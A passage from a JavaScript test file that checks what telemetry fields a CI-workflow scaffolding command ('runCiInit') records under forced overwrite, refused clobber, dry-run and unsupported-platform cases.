    const fs = makeFakeFs({ [WF]: 'old contents' });
    await runCiInit(opts({ project: 'p', force: true }), deps({ fs }));
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: true,
      workflowExisted: true,
      projectResolved: 'flag',
    });
  });

  it('refused clobber (exists, no --force) still records workflowExisted:true on the error path', async () => {
    await expect(
      runCiInit(opts({ project: 'p' }), deps({ fs: makeFakeFs({ [WF]: 'old contents' }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: false,
      workflowExisted: true,
      projectResolved: 'flag',
    });
  });

  it('--dry-run probes nothing, so workflowExisted is omitted', async () => {
    await runCiInit(opts({ dryRun: true }), deps());
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: false,
      projectResolved: 'auto',
    });
  });

  it('an unsupported platform records nothing (refused before the scaffold)', async () => {
    await expect(runCiInit(opts({ platform: 'gitlab' }), deps())).rejects.toMatchObject({
      code: 'VALIDATION_ERROR',
    });
    expect(takeTelemetryExtras()).toEqual({});
  });
});
